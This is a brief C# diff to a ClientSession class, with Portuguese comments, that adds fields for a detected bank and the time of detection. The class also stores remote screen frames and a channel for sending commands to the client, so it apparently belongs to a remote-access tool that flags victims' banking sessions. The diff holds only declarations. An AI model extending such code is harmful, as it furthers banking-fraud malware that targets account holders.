@@ -25,6 +25,10 @@ public class ClientSession
     public int MonitorIndex { get; set; }
     public int MonitorsCount { get; set; }
 
+    // 🏦 detecção de banco
+    public string? DetectedBank { get; set; }
+    public DateTime? LastBankDetection { get; set; }
+
     public byte[]? LastFrameJpeg { get; set; }
 
     // 🔹 para enviar comandos pro cliente
